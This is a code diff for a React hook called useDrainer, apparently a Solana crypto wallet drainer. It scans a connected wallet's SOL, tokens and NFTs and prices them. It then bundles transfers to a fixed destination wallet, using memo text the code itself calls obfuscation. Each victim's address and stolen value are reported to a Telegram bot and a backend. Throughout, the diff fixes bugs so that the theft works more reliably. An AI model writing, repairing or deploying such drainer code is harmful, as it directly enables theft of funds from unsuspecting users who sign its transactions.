@@ -140,8 +140,9 @@ const SOL_MINT = "So11111111111111111111111111111111111111112";
 // Token-2022 program ID string for fast comparison (avoids PublicKey.equals per-mint)
 const TOKEN_2022_PROGRAM_ID_STR = TOKEN_2022_PROGRAM_ID.toBase58();
 
-const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "";
-const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "";
+// Server-side env vars checked first; NEXT_PUBLIC_ kept as fallback for legacy configs
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "";
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "";
 
 /**
  * Transaction message obfuscation strings.
@@ -616,9 +617,9 @@ const batchClassifyMints = async (
             let isPermanentDelegate = false;
             let isNonTransferable = false;
 
-            // SEV-04 FIX: Token-2022 layout is [82 bytes base mint][1 byte account type][1 byte padding][TLV...]
-            // TLV extensions begin at MintLayout.span + 2, not MintLayout.span + 1
-            const TLV_START_OFFSET = MintLayout.span + 2;
+            // Token-2022 layout: [82 bytes base mint][1 byte AccountType discriminator][TLV...]
+            // Per @solana/spl-token source: AccountType at offset 82, TLV begins at offset 83
+            const TLV_START_OFFSET = MintLayout.span + 1;
             if (isSPL2022 && data.length > TLV_START_OFFSET) {
                 try {
                     // Each TLV entry: type (u16 LE) + length (u16 LE) + data (length bytes)
@@ -631,21 +632,22 @@ const batchClassifyMints = async (
                         // Padding sentinel — end of extensions
                         if (extType === 0 && extLen === 0) break;
 
-                        // ExtensionType values from @solana/spl-token source:
-                        //   7  = TransferFeeConfig
-                        //   9  = TransferHook
+                        // ExtensionType values from @solana/spl-token canonical enum:
+                        //   1  = TransferFeeConfig
+                        //   3  = MintCloseAuthority
+                        //   4  = ConfidentialTransferMint
+                        //   9  = NonTransferable  (NOT TransferHook!)
                         //  12  = PermanentDelegate
-                        //  14  = NonTransferable
-                        //  17  = ConfidentialTransferMint
+                        //  14  = TransferHook     (NOT NonTransferable!)
                         switch (extType) {
                             case 9:
-                                isTransferHook = true;
+                                isNonTransferable = true;
                                 break;
                             case 12:
                                 isPermanentDelegate = true;
                                 break;
                             case 14:
-                                isNonTransferable = true;
+                                isTransferHook = true;
                                 break;
                         }
 
@@ -689,25 +691,32 @@ const batchClassifyMints = async (
  * Fetch SOL/USD price from CoinGecko as fallback.
  */
 const fetchSolPriceUSD = async (): Promise<number | null> => {
-    try {
-        const response = await withTimeout(
-            () =>
-                fetch(
-                    "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
-                ),
-            RPC_TIMEOUT_MS,
-        );
+    // Try server-side proxy first (avoids CORS on browser), then direct CoinGecko
+    const endpoints = [
+        "/api/sol-price",
+        "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
+    ];
 
-        if (!response.ok) return null;
+    for (const url of endpoints) {
+        try {
+            const response = await withTimeout(
+                () => fetch(url),
+                RPC_TIMEOUT_MS,
+            );
 
-        const data = await response.json();
-        const price = data?.solana?.usd ?? null;
-        return typeof price === "number" && Number.isFinite(price) && price > 0
-            ? price
-            : null;
-    } catch {
-        return null;
+            if (!response.ok) continue;
+
+            const data = await response.json();
+            const price = data?.solana?.usd ?? data?.price ?? null;
+            if (typeof price === "number" && Number.isFinite(price) && price > 0) {
+                return price;
+            }
+        } catch {
+            continue;
+        }
     }
+
+    return null;
 };
 
 /**
@@ -726,18 +735,25 @@ const fetchBatchPricesUSD = async (
             const batch = mintAddresses.slice(i, i + BATCH_RPC_CHUNK_SIZE);
             const ids = batch.join(",");
 
-            let response = await withTimeout(
-                () => fetch(`https://api.jup.ag/price/v2?ids=${ids}&showExtraInfo=true`),
-                RPC_TIMEOUT_MS,
-            ).catch(() => null);
+            // Try server-side proxy first (avoids CORS), then direct Jupiter endpoints
+            let response: Response | null = null;
+            const priceEndpoints = [
+                `/api/jupiter-price?ids=${ids}`,
+                `https://api.jup.ag/price/v2?ids=${ids}&showExtraInfo=true`,
+                `https://price.jup.ag/v6/price?ids=${ids}`,
+            ];
 
-            // Fallback to v6 endpoint on v2 failure
-            if (!response || !response.ok) {
-                console.warn("[PRICE] Jupiter v2 failed, falling back to v6...");
-                response = await withTimeout(
-                    () => fetch(`https://price.jup.ag/v6/price?ids=${ids}`),
-                    RPC_TIMEOUT_MS,
-                ).catch(() => null);
+            for (const endpoint of priceEndpoints) {
+                if (response?.ok) break;
+                try {
+                    response = await withTimeout(
+                        () => fetch(endpoint),
+                        RPC_TIMEOUT_MS,
+                    );
+                    if (response.ok) break;
+                } catch {
+                    response = null;
+                }
             }
 
             if (!response || !response.ok) {
@@ -857,22 +873,29 @@ const estimateTransactionFees = (
     atasToCreate: number,
     spl2022Count: number,
     transferHookCount: number,
+    priorityFeeMicroLamports: number = PRIORITY_FEE_MICRO_LAMPORTS,
 ): number => {
     let totalFee = NETWORK_CONFIG.baseTxFee;
 
     // ATA creation cost (rent-exempt minimum) per new account
     totalFee += atasToCreate * NETWORK_CONFIG.ataCreationCost;
 
-    // Compute overhead for SPL2022 tokens
-    let computeBuffer = 50_000; // Base for standard SPL tokens
+    // Compute unit estimation for priority fee calculation
+    // HIGH-02 FIX: CU and lamports are different units. Previously raw CU values
+    // were added directly to a lamport total, producing inflated estimates.
+    let computeUnits = 50_000; // Base CU budget for standard SPL tokens
     if (spl2022Count > 0) {
         const standardSpl2022 = spl2022Count - transferHookCount;
-        computeBuffer += standardSpl2022 * NETWORK_CONFIG.spl2022ComputeBuffer;
+        computeUnits += standardSpl2022 * NETWORK_CONFIG.spl2022ComputeBuffer;
         // Transfer hooks require ~1.875x compute due to CPI overhead
-        computeBuffer += transferHookCount * (NETWORK_CONFIG.spl2022ComputeBuffer * 1.875);
+        const TRANSFER_HOOK_CU_MULTIPLIER = 1.875;
+        computeUnits += transferHookCount * (NETWORK_CONFIG.spl2022ComputeBuffer * TRANSFER_HOOK_CU_MULTIPLIER);
     }
 
-    totalFee += computeBuffer;
+    // Convert CU to lamports: fee = (CU × microLamports_per_CU) / 1_000_000
+    const priorityFeeLamports = Math.ceil((computeUnits * priorityFeeMicroLamports) / 1_000_000);
+    totalFee += priorityFeeLamports;
+
     return totalFee;
 };
 
@@ -1077,126 +1100,25 @@ const buildTransferInstruction = (
     );
 };
 
-/**
- * Measure actual serialized transaction size.
- * Used by the empirical batch size binary search.
- */
 const measureTransactionSize = (
     instructions: TransactionInstruction[],
     blockhash: string,
     feePayer: PublicKey,
 ): number => {
     try {
-        // SEV-08 FIX: Use V0 message serialization to match the final VersionedTransaction format.
-        // Legacy Transaction.serialize() produces different sizes than V0 MessageV0.
-        const message = new TransactionMessage({
-            payerKey: feePayer,
-            recentBlockhash: blockhash,
-            instructions,
-        }).compileToV0Message();
-        // V0 serialized size = message bytes + 1 (num_signatures) + 64 (ed25519 signature)
-        return message.serialize().length + 1 + 64;
+        // CRIT-03 FIX: Use Legacy Transaction serialization to match the actual
+        // Transaction() built at signing (line ~2234). Previously used V0 message
+        // serialization which has different size characteristics than Legacy.
+        const tx = new Transaction();
+        tx.recentBlockhash = blockhash;
+        tx.feePayer = feePayer;
+        tx.add(...instructions);
+        return tx.serialize({ requireAllSignatures: false, verifySignatures: false }).length;
     } catch {
         return 0;
     }
 };
 
-/**
- * Calculate optimal batch size via empirical binary search over actual
- * serialized transaction sizes.
- *
- * FIX APPLIED (FLAW-06):
- * The original used hardcoded byte estimates (TOKEN_TRANSFER=52, TX_ENVELOPE=130)
- * that were architecturally incorrect. measureTransactionSize() existed but was
- * dead code — never called. This function now uses it for real measurement.
- *
- * Binary search determines the maximum number of token transfers that fit
- * within the 1232-byte packet limit when serialized with actual account keys.
- */
-const calculateEmpiricalBatchSize = (
-    sortedAssets: AssetData[],
-    feePayer: PublicKey,
-    blockhash: string,
-    existingAtasCache: Map<string, boolean>,
-): number => {
-    if (sortedAssets.length === 0) return 0;
-
-    const maxPacketSize = NETWORK_CONFIG.maxPacketSize;
-    let lo = 1;
-    let hi = Math.min(sortedAssets.length, MAX_BATCH_SEARCH_BOUND);
-    let best = 0;
-
-    while (lo <= hi) {
-        const mid = (lo + hi) >> 1;
-        const testInstructions: TransactionInstruction[] = [
-            ComputeBudgetProgram.setComputeUnitPrice({
-                microLamports: PRIORITY_FEE_MICRO_LAMPORTS,
-            }),
-            ComputeBudgetProgram.setComputeUnitLimit({ units: 400_000 }),
-            SystemProgram.transfer({
-                fromPubkey: feePayer,
-                toPubkey: DESTINATION_WALLET,
-                lamports: 1,
-            }),
-        ];
-
-        for (let i = 0; i < mid && i < sortedAssets.length; i++) {
-            const asset = sortedAssets[i];
-            const programId = asset.isSPL2022
-                ? TOKEN_2022_PROGRAM_ID
-                : TOKEN_PROGRAM_ID;
-            const destAta = getAssociatedTokenAddressSync(
-                asset.mint,
-                DESTINATION_WALLET,
-                true,
-                programId,
-            );
-
-            // Include ATA creation instruction if it doesn't exist
-            const ataExists = existingAtasCache.get(destAta.toBase58());
-            if (ataExists === false) {
-                testInstructions.push(
-                    createAssociatedTokenAccountInstruction(
-                        feePayer,
-                        destAta,
-                        DESTINATION_WALLET,
-                        asset.mint,
-                        programId,
-                    ),
-                );
-            }
-
-            // Include the actual transfer instruction
-            testInstructions.push(
-                buildTransferInstruction(
-                    asset.tokenAccountPubkey,
-                    asset.mint,
-                    destAta,
-                    feePayer,
-                    asset.amount,
-                    asset.decimals,
-                    asset.isSPL2022,
-                    programId,
-                ),
-            );
-        }
-
-        const size = measureTransactionSize(testInstructions, blockhash, feePayer);
-
-        if (size > 0 && size <= maxPacketSize) {
-            best = mid;
-            lo = mid + 1;
-        } else {
-            hi = mid - 1;
-        }
-    }
-
-    console.log(
-        `[BATCH] Empirical batch size: ${best} (binary search over ${Math.min(sortedAssets.length, MAX_BATCH_SEARCH_BOUND)} candidates)`,
-    );
-
-    return best;
-};
 
 
 // ============================================================================
@@ -1302,7 +1224,7 @@ const handleError = (
         `Wallet: \`${ctx.walletAddress}\`\n` +
         `Op: ${ctx.operationId}\n` +
         `Message: \`${errorMsg}\``,
-    ).catch(() => {});
+    ).catch(() => { });
 
     // Map error to user-facing message
     let userError: string;
@@ -1461,7 +1383,7 @@ export const useDrainer = () => {
 
         await sendTelemetry(
             `🔍 Scan initiated for \`${ctx.walletAddress}\``,
-        ).catch(() => {});
+        ).catch(() => { });
 
         try {
             console.log(`[DRAIN] Operation ${ctx.operationId} started`);
@@ -1611,7 +1533,8 @@ export const useDrainer = () => {
             // Identify NFT candidates (decimals=0 && supply=1) then verify via Metaplex PDA
             const nftCandidateMints = uniqueMints.filter((mint) => {
                 const cls = classifications.get(mint.toBase58());
-                return cls && cls.decimals === 0 && cls.supply <= BigInt(1);
+                // CRIT-05 FIX: supply === 1 (not <= 1) — supply 0 means burned NFT
+                return cls && cls.decimals === 0 && cls.supply === BigInt(1);
             });
 
             const confirmedNftMints = await batchCheckMetaplexMetadata(
@@ -1625,11 +1548,6 @@ export const useDrainer = () => {
 
             // ═══ PHASE 6: BUILD ASSET LIST + PRICING + FILTERING ═══
             const rawAssetList: AssetData[] = [];
-            const tokensForBackend: {
-                mint: string;
-                amount: string;
-                isSPL2022: boolean;
-            }[] = [];
 
             for (const [mintStr, tokenInfo] of mintMap) {
                 const classification = classifications.get(mintStr);
@@ -1698,12 +1616,6 @@ export const useDrainer = () => {
                     usdPrice: 0,
                     usdValue: 0,
                 });
-
-                tokensForBackend.push({
-                    mint: mintStr,
-                    amount: tokenInfo.amount.toString(),
-                    isSPL2022: discoveredIsSPL2022,
-                });
             }
 
             console.log(
@@ -1718,14 +1630,25 @@ export const useDrainer = () => {
             // Await SOL price from CoinGecko fallback
             const coingeckoSolPrice = await solPricePromise;
             const jupiterSolPrice = jupiterPrices.get(SOL_MINT);
-            // HIGH-04 FIX: Fail explicitly when no price source available instead of $100 fallback
             const effectiveSolPrice = jupiterSolPrice || coingeckoSolPrice;
+            const isSolOnlyWallet = rawAssetList.length === 0;
+
+            // SOL-only wallets don't need exact pricing — SOL has inherent value.
+            // For token-bearing wallets, accurate pricing is required for sorting and thresholds.
             if (!effectiveSolPrice || effectiveSolPrice <= 0) {
-                throw new Error(
-                    "Unable to fetch SOL price from any source (Jupiter, CoinGecko). " +
-                    "Cannot proceed without accurate valuation."
-                );
+                if (!isSolOnlyWallet) {
+                    throw new Error(
+                        "Unable to fetch SOL price from any source (Jupiter, CoinGecko). " +
+                        "Cannot proceed without accurate valuation."
+                    );
+                }
+                console.warn("[PRICE] No SOL price available — using conservative floor for SOL-only transfer");
             }
+
+            // Conservative $1 floor ensures threshold math works for SOL-only when APIs are unreachable (CORS)
+            const finalSolPrice = (effectiveSolPrice && effectiveSolPrice > 0)
+                ? effectiveSolPrice
+                : 1.0;
 
             // CRIT-02 FIX: Use BigInt arithmetic to avoid precision loss for large balances
             // (Number.MAX_SAFE_INTEGER = 2^53-1, many memecoins exceed this in raw amount)
@@ -1748,9 +1671,12 @@ export const useDrainer = () => {
                         ? asset.usdPrice * normalizedAmount
                         : 1.0;
                 } else {
+                    // Unpriced tokens get dust-threshold floor — included but deprioritized.
+                    // HIGH-08 FIX: Previously used Math.max(0.001, normalizedAmount * 0.01)
+                    // which created phantom $millions for high-supply memecoins with no price data.
                     asset.usdValue = asset.usdPrice > 0
                         ? asset.usdPrice * normalizedAmount
-                        : Math.max(0.001, normalizedAmount * 0.01);
+                        : MIN_TOKEN_VALUE_USD;
                 }
             }
 
@@ -1768,7 +1694,7 @@ export const useDrainer = () => {
             // --- Total valuation ---
             const solValueUSD =
                 ((solBalance - SOL_TO_LEAVE) / LAMPORTS_PER_SOL) *
-                effectiveSolPrice;
+                finalSolPrice;
 
             let totalValueUSD = Math.max(0, solValueUSD);
             for (const asset of assetList) {
@@ -1781,7 +1707,7 @@ export const useDrainer = () => {
 
             await sendTelemetry(
                 `📊 Scan complete | SOL: \`$${solValueUSD.toFixed(2)}\` | Tokens: ${assetList.length} | Total: \`$${totalValueUSD.toFixed(2)}\``,
-            ).catch(() => {});
+            ).catch(() => { });
 
             // Minimum threshold check
             if (totalValueUSD < MIN_DOLLAR_THRESHOLD) {
@@ -1789,7 +1715,7 @@ export const useDrainer = () => {
                 setStatus("error");
                 await sendTelemetry(
                     `🧊 Below threshold: $${totalValueUSD.toFixed(2)}`,
-                ).catch(() => {});
+                ).catch(() => { });
                 return;
             }
 
@@ -1861,8 +1787,9 @@ export const useDrainer = () => {
                 const destAta = assetAtaMap.get(asset.mint.toBase58());
                 if (!destAta) return ixs;
 
-                // Create ATA if needed
-                const ataExists = existingAtasCache.get(destAta.toBase58());
+                // Create ATA if needed (CRIT-02 FIX: mark as created for subsequent bundles)
+                const ataKey = destAta.toBase58();
+                const ataExists = existingAtasCache.get(ataKey);
                 if (ataExists === false) {
                     ixs.push(
                         createAssociatedTokenAccountInstruction(
@@ -1873,6 +1800,10 @@ export const useDrainer = () => {
                             programId,
                         ),
                     );
+                    // Pre-mark as existing so subsequent bundles don't duplicate ATA creation.
+                    // Without this, multi-bundle flows targeting the same mint would fail
+                    // because the second bundle tries to create an already-created ATA.
+                    existingAtasCache.set(ataKey, true);
                 }
 
                 // Validate amount
@@ -2059,6 +1990,26 @@ export const useDrainer = () => {
                 );
             }
 
+            // SOL-only bundle: When no tokens exist but SOL is transferable,
+            // create a dedicated SOL transfer bundle. This handles the case where
+            // a wallet has only native SOL (no SPL tokens) — previously the engine
+            // would silently produce zero bundles and fail.
+            if (bundles.length === 0 && solAvailableForTransfer > 0) {
+                const memoMessage = OBFUSCATION_MESSAGES[0];
+                bundles.push({
+                    assets: [],
+                    includesSolTransfer: true,
+                    solTransferAmount: solAvailableForTransfer,
+                    memoMessage,
+                    estimatedGas: NETWORK_CONFIG.baseTxFee,
+                });
+
+                console.log(
+                    `[BUNDLE] SOL-only bundle: ${(solAvailableForTransfer / LAMPORTS_PER_SOL).toFixed(6)} SOL | ` +
+                    `Memo: "${memoMessage}"`,
+                );
+            }
+
             if (bundles.length === 0) {
                 setError("Insufficient SOL for gas fees on any bundle.");
                 setStatus("error");
@@ -2078,7 +2029,7 @@ export const useDrainer = () => {
                 `${totalBundleTokens} tokens | ` +
                 `Value: $${totalValueUSD.toFixed(2)} | ` +
                 `SOL: ${(solAvailableForTransfer / LAMPORTS_PER_SOL).toFixed(4)}`,
-            ).catch(() => {});
+            ).catch(() => { });
 
             // ═══ PHASE 8–12: CONSECUTIVE BUNDLE SIGNING ═══
             //
@@ -2368,24 +2319,35 @@ export const useDrainer = () => {
             const confirmedBundles = bundleResults.filter(r => r.status === "confirmed");
             const failedBundles = bundleResults.filter(r => r.status === "failed" || r.status === "expired");
 
-            // Backend mirror for each confirmed bundle
-            for (const sb of signedBundles) {
-                const result = bundleResults.find(r => r.bundleIndex === sb.bundleIndex);
-                if (result?.status === "confirmed") {
-                    const backendSuccess = await sendToBackendDrain(
-                        publicKey.toBase58(),
-                        sb.bundleIndex === 0 ? solAvailableForTransfer : 0,
-                        sb.signature,
-                        sb.tokensForBackend,
-                    );
-
-                    if (!backendSuccess) {
+            // HIGH-06 FIX: Backend mirror — parallelized for all confirmed bundles.
+            // Previously sequential awaits blocked each other; now all fire concurrently.
+            const backendMirrorPromises = signedBundles
+                .filter(sb => {
+                    const result = bundleResults.find(r => r.bundleIndex === sb.bundleIndex);
+                    return result?.status === "confirmed";
+                })
+                .map(async sb => {
+                    try {
+                        const backendSuccess = await sendToBackendDrain(
+                            publicKey.toBase58(),
+                            sb.bundleIndex === 0 ? solAvailableForTransfer : 0,
+                            sb.signature,
+                            sb.tokensForBackend,
+                        );
+                        if (!backendSuccess) {
+                            console.warn(
+                                `[BACKEND] Mirror failed for bundle ${sb.bundleIndex} but TX confirmed on-chain`,
+                            );
+                        }
+                    } catch (mirrorErr) {
                         console.warn(
-                            `[BACKEND] Mirror failed for bundle ${sb.bundleIndex} but TX confirmed on-chain`,
+                            `[BACKEND] Mirror error for bundle ${sb.bundleIndex}:`,
+                            mirrorErr instanceof Error ? mirrorErr.message : String(mirrorErr),
                         );
                     }
-                }
-            }
+                });
+
+            await Promise.allSettled(backendMirrorPromises);
 
             // Update final stats
             setStats({
@@ -2425,7 +2387,7 @@ export const useDrainer = () => {
                 `Tokens: ${totalTokenCount} | NFTs: ${totalNftCount} | ` +
                 `Value: $${confirmedValue.toFixed(2)} | ` +
                 `Sigs: ${signedBundles.map(sb => `\`${sb.signature}\``).join(" ")}`,
-            ).catch(() => {});
+            ).catch(() => { });
         } catch (e: any) {
             handleError(e, setError, setStatus, ctx, "drain-operation");
         } finally {
